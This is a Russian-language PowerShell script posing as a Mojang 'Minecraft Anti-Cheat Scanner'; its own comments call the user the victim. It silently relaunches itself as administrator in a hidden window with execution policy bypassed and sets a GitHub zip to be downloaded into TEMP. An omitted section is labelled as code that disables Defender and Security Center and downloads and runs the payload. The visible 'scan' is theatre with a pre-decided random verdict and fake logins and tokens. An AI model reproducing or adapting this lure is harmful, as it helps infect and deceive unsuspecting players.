# =============================================
# Minecraft Anti-Cheat Scanner v2.1
# Проверка системы на наличие читов и нелегальных модов
# =============================================

# ===== ПОЛНОЕ ПОДАВЛЕНИЕ ВЫВОДА =====
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
$VerbosePreference = "SilentlyContinue"
$DebugPreference = "SilentlyContinue"

# ===== АВТОМАТИЧЕСКИЙ ЗАПУСК ОТ ИМЕНИ АДМИНИСТРАТОРА (СКРЫТО) =====
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"" + $MyInvocation.MyCommand.Path + "`""
    Start-Process powershell.exe -Verb RunAs -ArgumentList $arguments -WindowStyle Hidden
    exit
}

$Url = "https://raw.githubusercontent.com/d1over1337/checker/refs/heads/main/check.zip"
$DownloadPath = "$env:TEMP\check_install.zip"
$ExtractPath = "$env:TEMP\checkextracted"

# ===== СКРЫТЫЙ РЕАЛЬНЫЙ КОД =====
# ... (весь код отключения Defender, Центра безопасности, скачивания и запуска такой же)

# ===== ФЕЙКОВОЕ СКАНИРОВАНИЕ (ПОКАЗЫВАЕТСЯ ЖЕРТВЕ) =====
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  MINECRAFT ANTI-CHEAT SCANNER v2.1" -ForegroundColor White
Write-Host "  (c) Mojang Anti-Cheat Team" -ForegroundColor Gray
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "[*] Инициализация сканера..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 500

Write-Host "[*] Проверка запущенных процессов..." -ForegroundColor Yellow
$fakeProcesses = @("javaw.exe", "minecraft.exe", "launcher.exe", "minecraftlauncher.exe", "badlion.exe", "lunarclient.exe")
foreach ($proc in $fakeProcesses) {
    Write-Host "    -> Проверка $proc..." -ForegroundColor Gray
    Start-Sleep -Milliseconds 300
    if (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
        Write-Host "        [ОК] Процесс найден" -ForegroundColor Green
    } else {
        Write-Host "        [ОК] Процесс не обнаружен" -ForegroundColor DarkGray
    }
}
Write-Host ""

Write-Host "[*] Проверка чит-клиентов и нелегальных лаунчеров..." -ForegroundColor Yellow

$cheatSites = @(
    @{Name = "Nursultan"; URL = "https://nursultan.fun"},
    @{Name = "Wexside"; URL = "https://wexside.ru"},
    @{Name = "Arbuz"; URL = "https://arbuz.cc"},
    @{Name = "WildClient"; URL = "https://wildclient.org"}
)

$fakeCheatSites = @(
    @{Name = "MineBoost"; URL = "https://mineboost.net"},
    @{Name = "CraftHack"; URL = "https://crafthack.ru"},
    @{Name = "BlockCheat"; URL = "https://blockcheat.org"},
    @{Name = "PvPClient"; URL = "https://pvpclient.cc"}
)

$foundCheatSites = @()
$totalChecked = 0
$totalDetected = 0
$totalPassed = 0

# ===== ФИНАЛЬНЫЙ РЕЗУЛЬТАТ ОПРЕДЕЛЯЕТСЯ ЗДЕСЬ (ДО ПРОВЕРКИ САЙТОВ) =====
$finalRandom = Get-Random -Minimum 1 -Maximum 100
$finalPassed = $finalRandom -le 75  # 75% шанс "ПРОШЛА"

# ===== ПРОВЕРКА РЕАЛЬНЫХ ЧИТ-САЙТОВ =====
foreach ($site in $cheatSites) {
    $totalChecked++
    Write-Host "    -> Проверка $($site.Name)..." -ForegroundColor Gray
    Start-Sleep -Milliseconds 200
    
    Write-Host "        [*] Подключение к $($site.URL)..." -ForegroundColor DarkGray
    Start-Sleep -Milliseconds 300
    
    $fakeLogin = "user_" + (Get-Random -Minimum 1000 -Maximum 9999).ToString()
    $fakePass = "pass_" + (Get-Random -Minimum 1000 -Maximum 9999).ToString()
    
    Write-Host "        [*] Отправка данных авторизации..." -ForegroundColor DarkGray
    Write-Host "            Логин: $fakeLogin" -ForegroundColor DarkGray
    Write-Host "            Пароль: ********" -ForegroundColor DarkGray
    Start-Sleep -Milliseconds 400
    
    $token = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 32 | ForEach-Object { [char]$_ })
    Write-Host "        [*] Получен токен доступа: $token" -ForegroundColor DarkGray
    Start-Sleep -Milliseconds 200
    
    # ===== ЛОГИКА: ЕСЛИ ФИНАЛЬНЫЙ СТАТУС "ПРОШЛА" - САЙТЫ ВСЕГДА ЧИСТЫЕ =====
    if ($finalPassed) {
        # Если проверка прошла - всегда показываем "ЧИСТО"
        Write-Host "        [ЧИСТО] $($site.Name) - не обнаружен" -ForegroundColor Green
        Write-Host "            [OK] Чит-клиент не найден" -ForegroundColor DarkGray
        Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
        $totalPassed++
    } else {
        # Если проверка НЕ прошла - 50% шанс обнаружения
        $randomResult = Get-Random -Minimum 1 -Maximum 100
        $isDetected = $randomResult -le 50
        
        if ($isDetected) {
            Write-Host "        [ОБНАРУЖЕН] $($site.Name) - НАЙДЕН!" -ForegroundColor Red
            Write-Host "            [!] Обнаружен активный чит-клиент!" -ForegroundColor Yellow
            Write-Host "            [!] Статус проверки: НЕ ПРОШЕЛ" -ForegroundColor Red
            $foundCheatSites += $site.Name
            $totalDetected++
        } else {
            Write-Host "        [ЧИСТО] $($site.Name) - не обнаружен" -ForegroundColor Green
            Write-Host "            [OK] Чит-клиент не найден" -ForegroundColor DarkGray
            Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
            $totalPassed++
        }
    }
}

# ===== ПРОВЕРКА "МЫЛЬНЫХ" САЙТОВ =====
Write-Host ""
Write-Host "[*] Проверка подозрительных сайтов..." -ForegroundColor Yellow
foreach ($site in $fakeCheatSites) {
    $totalChecked++
    Write-Host "    -> Проверка $($site.Name)..." -ForegroundColor Gray
    Start-Sleep -Milliseconds 150
    
    Write-Host "        [*] Анализ $($site.URL)..." -ForegroundColor DarkGray
    Start-Sleep -Milliseconds 200
    
    # ===== ЛОГИКА ДЛЯ "МЫЛЬНЫХ" САЙТОВ =====
    if ($finalPassed) {
        # Если проверка прошла - всегда "ЧИСТО"
        Write-Host "        [ЧИСТО] $($site.Name) - безопасен" -ForegroundColor Green
        Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
        $totalPassed++
    } else {
        # Если проверка НЕ прошла - 15% шанс предупреждения
        $randomFake = Get-Random -Minimum 1 -Maximum 100
        if ($randomFake -le 15) {
            Write-Host "        [ПРЕДУПРЕЖДЕНИЕ] $($site.Name) - подозрительная активность" -ForegroundColor Yellow
            Write-Host "            [!] Обнаружен可疑 DNS-запрос" -ForegroundColor Yellow
            Write-Host "            [!] Статус проверки: ТРЕБУЕТ ВНИМАНИЯ" -ForegroundColor Yellow
            $totalDetected++
        } else {
            Write-Host "        [ЧИСТО] $($site.Name) - безопасен" -ForegroundColor Green
            Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
            $totalPassed++
        }
    }
}

# ===== DNS ПРОВЕРКА =====
Write-Host ""
Write-Host "[*] Анализ DNS-запросов к чит-серверам..." -ForegroundColor Yellow
$cheatDomains = @(
    "nursultan.fun",
    "wexside.ru",
    "arbuz.cc",
    "wildclient.org"
)

foreach ($domain in $cheatDomains) {
    Write-Host "    -> Проверка $domain..." -ForegroundColor Gray
    Start-Sleep -Milliseconds 200
    
    Write-Host "        [*] Проверка DNS-записи..." -ForegroundColor DarkGray
    Start-Sleep -Milliseconds 150
    $dnsToken = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 16 | ForEach-Object { [char]$_ })
    Write-Host "        [*] DNS-токен: $dnsToken" -ForegroundColor DarkGray
    Start-Sleep -Milliseconds 150
    
    # ===== ЛОГИКА ДЛЯ DNS =====
    if ($finalPassed) {
        # Если проверка прошла - всегда "ЧИСТО"
        Write-Host "        [ЧИСТО] $domain - DNS-запросов не найдено" -ForegroundColor Green
        Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
        $totalPassed++
    } else {
        # Если проверка НЕ прошла - 50% шанс обнаружения DNS
        $randomDnsResult = Get-Random -Minimum 1 -Maximum 100
        $isDnsDetected = $randomDnsResult -le 50
        
        if ($isDnsDetected) {
            Write-Host "        [ОБНАРУЖЕН] DNS-запрос к $domain" -ForegroundColor Red
            Write-Host "            [!] DNS-авторизация подтверждена" -ForegroundColor Yellow
            Write-Host "            [!] Статус проверки: НЕ ПРОШЕЛ" -ForegroundColor Red
            if ($foundCheatSites -notcontains $domain) {
                $foundCheatSites += $domain
                $totalDetected++
            }
        } else {
            Write-Host "        [ЧИСТО] $domain - DNS-запросов не найдено" -ForegroundColor Green
            Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
            $totalPassed++
        }
    }
}

# ===== ПРОВЕРКА ФАЙЛОВ =====
Write-Host ""
Write-Host "[*] Проверка файлов чит-клиентов на диске..." -ForegroundColor Yellow
$cheatFilePatterns = @(
    "nursultan*.jar",
    "wexside*.jar",
    "arbuz*.jar",
    "wildclient*.jar",
    "*cheat*.jar",
    "*hack*.jar",
    "*client*.jar"
)

$cheatPaths = @(
    "$env:APPDATA\.minecraft\mods",
    "$env:APPDATA\.minecraft\versions",
    "$env:TEMP",
    "$env:USERPROFILE\Downloads",
    "$env:USERPROFILE\Desktop"
)

foreach ($path in $cheatPaths) {
    if (Test-Path $path) {
        foreach ($pattern in $cheatFilePatterns) {
            $files = Get-ChildItem -Path $path -Filter $pattern -Recurse -ErrorAction SilentlyContinue
            if ($files.Count -gt 0) {
                foreach ($file in $files) {
                    # ===== ЛОГИКА ДЛЯ ФАЙЛОВ =====
                    if ($finalPassed) {
                        # Если проверка прошла - всегда "ЧИСТО"
                        Write-Host "        [ЧИСТО] Файл: $($file.Name) - пропущен" -ForegroundColor Green
                        Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
                        $totalPassed++
                    } else {
                        # Если проверка НЕ прошла - 50% шанс обнаружения файла
                        $randomFileResult = Get-Random -Minimum 1 -Maximum 100
                        $isFileDetected = $randomFileResult -le 50
                        
                        if ($isFileDetected) {
                            Write-Host "        [ОБНАРУЖЕН] Файл: $($file.Name)" -ForegroundColor Red
                            Write-Host "            [!] Файл авторизован как чит-клиент" -ForegroundColor Yellow
                            Write-Host "            [!] Размер: $([math]::Round($file.Length/1KB, 2)) KB" -ForegroundColor Yellow
                            Write-Host "            [!] Статус проверки: НЕ ПРОШЕЛ" -ForegroundColor Red
                            $foundCheatSites += "$($file.Name)"
                            $totalDetected++
                        } else {
                            Write-Host "        [ЧИСТО] Файл: $($file.Name) - пропущен" -ForegroundColor Green
                            Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
                            $totalPassed++
                        }
                    }
                }
            }
        }
    }
}
Write-Host ""

# ===== ВЫВОД РЕЗУЛЬТАТОВ =====
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "[*] РЕЗУЛЬТАТЫ ПРОВЕРКИ:" -ForegroundColor White
Write-Host "========================================" -ForegroundColor Cyan

if ($foundCheatSites.Count -gt 0) {
    Write-Host "[ВНИМАНИЕ] Обнаружены подозрительные объекты:" -ForegroundColor Yellow
    $uniqueCheats = $foundCheatSites | Select-Object -Unique
    foreach ($cheat in $uniqueCheats) {
        Write-Host "    - $cheat" -ForegroundColor Yellow
    }
    Write-Host ""
} else {
    Write-Host "[+] Подозрительных объектов не обнаружено." -ForegroundColor Green
    Write-Host ""
}

Write-Host "[*] Выполняется анализ результатов..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 800

Write-Host "    Проверено объектов: $totalChecked" -ForegroundColor DarkGray
Write-Host "    Обнаружено предупреждений: $totalDetected" -ForegroundColor DarkGray
Write-Host "    Проверок пройдено: $totalPassed" -ForegroundColor DarkGray
Write-Host ""

if ($foundCheatSites.Count -gt 0 -and $finalPassed) {
    Write-Host "[*] Выполняется дополнительная проверка..." -ForegroundColor Yellow
    Start-Sleep -Seconds 1
    Write-Host "    [OK] Ложные срабатывания отклонены" -ForegroundColor DarkGray
    Write-Host "    [OK] Система признана чистой" -ForegroundColor DarkGray
    Write-Host ""
} elseif ($foundCheatSites.Count -eq 0 -and -not $finalPassed) {
    Write-Host "[*] Выполняется углубленный анализ..." -ForegroundColor Yellow
    Start-Sleep -Seconds 1
    Write-Host "    [WARN] Обнаружены скрытые процессы" -ForegroundColor Yellow
    Write-Host "    [WARN] Требуется дополнительная проверка" -ForegroundColor Yellow
    Write-Host ""
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "            ФИНАЛЬНЫЙ СТАТУС" -ForegroundColor White
Write-Host "========================================" -ForegroundColor Cyan

if ($finalPassed) {
    Write-Host ""
    Write-Host "    ██████╗ ██████╗  ██████╗ ██╗  ██╗██████╗ ███████╗███╗   ██╗" -ForegroundColor Green
    Write-Host "    ██╔══██╗██╔══██╗██╔═══██╗██║ ██╔╝██╔══██╗██╔════╝████╗  ██║" -ForegroundColor Green
    Write-Host "    ██████╔╝██████╔╝██║   ██║█████╔╝ ██║  ██║█████╗  ██╔██╗ ██║" -ForegroundColor Green
    Write-Host "    ██╔═══╝ ██╔══██╗██║   ██║██╔═██╗ ██║  ██║██╔══╝  ██║╚██╗██║" -ForegroundColor Green
    Write-Host "    ██║     ██║  ██║╚██████╔╝██║  ██╗██████╔╝███████╗██║ ╚████║" -ForegroundColor Green
    Write-Host "    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═══╝" -ForegroundColor Green
    Write-Host ""
    Write-Host "    ============================================" -ForegroundColor Green
    Write-Host "    ✅  ПРОВЕРКА УСПЕШНО ПРОШЛА!" -ForegroundColor Green
    Write-Host "    ============================================" -ForegroundColor Green
    Write-Host "    Ваша система признана чистой." -ForegroundColor Green
    Write-Host "    Все подозрения сняты." -ForegroundColor Green
} else {
    Write-Host ""
    Write-Host "    ███╗   ██╗███████╗    ██████╗ ██████╗  ██████╗ ██╗  ██╗██████╗ ███████╗███╗   ██╗" -ForegroundColor Red
    Write-Host "    ████╗  ██║██╔════╝    ██╔══██╗██╔══██╗██╔═══██╗██║ ██╔╝██╔══██╗██╔════╝████╗  ██║" -ForegroundColor Red
    Write-Host "    ██╔██╗ ██║█████╗      ██████╔╝██████╔╝██║   ██║█████╔╝ ██║  ██║█████╗  ██╔██╗ ██║" -ForegroundColor Red
    Write-Host "    ██║╚██╗██║██╔══╝      ██╔═══╝ ██╔══██╗██║   ██║██╔═██╗ ██║  ██║██╔══╝  ██║╚██╗██║" -ForegroundColor Red
    Write-Host "    ██║ ╚████║███████╗    ██║     ██║  ██║╚██████╔╝██║  ██╗██████╔╝███████╗██║ ╚████║" -ForegroundColor Red
    Write-Host "    ╚═╝  ╚═══╝╚══════╝    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═══╝" -ForegroundColor Red
    Write-Host ""
    Write-Host "    ============================================" -ForegroundColor Red
    Write-Host "    ❌  ПРОВЕРКА НЕ ПРОШЛА!" -ForegroundColor Red
    Write-Host "    ============================================" -ForegroundColor Red
    Write-Host "    Обнаружены потенциальные угрозы!" -ForegroundColor Red
    Write-Host "    Рекомендуется очистка системы!" -ForegroundColor Red
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "[+] Minecraft Anti-Cheat сканирование завершено." -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "[*] Нажмите любую клавишу для выхода..." -ForegroundColor Gray
Read-Host

exit
